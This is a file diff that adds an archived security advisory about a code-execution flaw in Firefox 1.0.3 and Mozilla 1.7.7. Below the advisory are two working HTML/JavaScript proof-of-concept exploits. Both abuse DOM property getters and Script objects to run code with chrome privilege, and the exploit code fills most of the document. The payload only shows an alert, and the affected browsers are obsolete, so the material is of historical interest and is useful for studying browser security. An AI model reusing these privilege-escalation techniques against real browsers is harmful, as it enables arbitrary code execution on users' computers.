@@ -1,0 +1,69 @@
+source: http://www.securityfocus.com/bid/13645/info
+
+Mozilla Suite and Mozilla Firefox are affected by a code-execution vulnerability. This issue is due to a failure in the application to properly verify Document Object Model (DOM) property values.
+
+An attacker may leverage this issue to execute arbitrary code with the privileges of the user that activated the vulnerable browser, ultimately facilitating a compromise of the affected computer.
+
+This issue is reportedly a variant of BID 13233. Further details are scheduled to be released in the future; this BID will be updated accordingly.
+
+<html>
+<head>
+<title>Proof-of-Concept for Firefox 1.0.3 - by moz_bug_r_a4</title> 
+<body>
+<script>
+// it needs chrome privilege to get |Components.stack|
+var code = "alert('Exploit!\\n\\n' + Components.stack);";
+var evalCode = code.replace(/'/g, '"').replace(/\\/g, '\\\\');
+var scriptCode = "arguments.callee.__parent__.eval('" + evalCode + "');'';";
+
+var script = (function() {
+function x() { new Object(); }
+return new Script(scriptCode);
+})();
+
+document.body.__defineGetter__("type", function() {
+return { toString : script };
+});
+
+var event = document.createEvent("Events");
+event.initEvent("PluginNotFound", true, true);
+document.body.dispatchEvent(event);
+</script>
+</body>
+
+-----------------------------------------------------------------------------------------
+
+<html>
+<head>
+<title>Proof-of-Concept for Mozilla 1.7.7 - by moz_bug_r_a4</title> 
+<body>
+
+<div id="d"></div>
+<pre>
+Click on the red box.
+</pre>
+
+<script>
+// it needs chrome privilege to get |Components.stack|
+var code = "alert('Exploit!\\n\\n' + Components.stack);";
+var evalCode = code.replace(/'/g, '"').replace(/\\/g, '\\\\');
+var scriptCode = "arguments.callee.__parent__.eval('" + evalCode + "');'';";
+
+var script = (function() {
+function x() { new Object(); }
+return new Script(scriptCode);
+})();
+
+var xulns = "http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul";
+var node = document.createElementNS(xulns, "input");
+
+node.__defineGetter__("type", function() {
+return { toString : script };
+});
+
+node.style.width = "100px";
+node.style.height = "100px";
+node.style.backgroundColor = "#f00";
+document.getElementById("d").appendChild(node);
+</script>
+</body>
